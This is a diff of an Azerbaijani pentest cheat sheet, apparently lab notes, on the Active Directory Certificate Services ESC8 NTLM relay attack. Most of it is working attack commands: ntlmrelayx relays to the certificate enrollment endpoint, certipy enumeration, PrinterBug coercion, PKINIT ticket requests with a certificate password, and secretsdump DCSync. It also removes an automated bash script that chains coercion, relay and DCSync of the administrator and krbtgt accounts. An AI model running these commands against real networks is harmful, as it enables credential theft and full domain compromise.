@@ -7,15 +7,18 @@ AD CS NTLM Relay Hücumu (ESC8) - NTLM Relay istifadə edərək Active Directory
 
 ====== İMPACKET =================================================================================================================================================================
 
-impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+impacket-ntlmrelayx -t http://CertificateServer-IP/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
                                  Relax olunacaq Server             ADCS   SMBv2 Sup.  Kerberos üçün istifadə oluna bilən Sertifikat     
 
 ====== CERTIPY =================================================================================================================================================================
 
+Certificate Server IP = CA
+Domain Controller = DC
+
 pip install certipy-ad
 
 # Prerequisites Check
-certipy-ad find -u 'username@domain' -p 'Pass123!' -dc-ip DC_IP -target domain.local
+certipy-ad find -u 'username@domain' -p 'Pass123!' -dc-ip DC_IP -target CA.IP
 certipy-ad find -u 'user' -p 'pass' -dc-ip DC_IP -username target_admin
 
 # 1. PrinterBug ( HTTP or HTTPS = True )
@@ -58,7 +61,7 @@ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
 pip3 install -r requirements.txt
 pip3 install -I git+https://github.com/wbond/oscrypto.git
 
-python3 gettgtpkinit.py -cert-pfx /home/sako/Special-Tools/Active-Directory/Pywhisker/pywhisker/457l8Zmd.pfx -pfx-pass bmRH4LK7UwPrAOfvIx6W -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+python3 gettgtpkinit.py -cert-pfx /home/sako/user.pfx -pfx-pass bmRH4LK7UwPrAOfvIx6W -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 export KRB5CCNAME=/tmp/jpinkman.ccache
 klist
 
@@ -71,33 +74,6 @@ impacket-ntlmrelayx -t ldaps://DC.domain.local --adcs-device-interface \
 # 5. Auth və DCSync
 secretsdump.py -k -no-pass inlanefreight.local/<USER>@10.129.234.174
 
-
-OneLine:
-#!/bin/bash
-# =====================================================
-# Certipy ESC8 - Variable Aware (Pro)
-# =====================================================
-
-DOMAIN="domain.local"      # ← Dəyiş
-TARGET="target.host"       # ← Dəyiş  
-DC="10.10.10.10"           # ← Dəyiş
-TEMPLATE="VulnerableCert"  # ← Enum-dan al
-CA="Domain CA"             # ← Enum-dan al
-ATTACKER_IP=$(hostname -I | awk '{print $1}')
-
-mkdir -p certs && \
-echo "$TARGET $ATTACKER_IP\nDC.$DOMAIN $DC" > hosts.txt && \
-python3 printerbug.py "$DOMAIN/relay@$TARGET" "http://$ATTACKER_IP:80" & \
-certipy relay -br -t "ldaps://$DC" -target "CIFS\\$TARGET" \
-  --dns-hosts-file hosts.txt --template "$TEMPLATE" \
-  --template MachineAuth --ca-name "$CA" -lf ./certs/ \
-  --no-validate-certs --quiet & sleep 5 && \
-for cert in ./certs/*.pfx; do
-  echo "[+] DCSync: $cert" && \
-  certipy auth -pfx "$cert" -username "$(basename "$cert" .pfx | sed 's/\..*//')$" \
-    -domain "$DOMAIN" -dc-ip "$DC" \
-    -dcsync "$DOMAIN/administrator,$DOMAIN/krbtgt"
-done
 
 ====== PassTheCert =================================================================================================================================================================
 
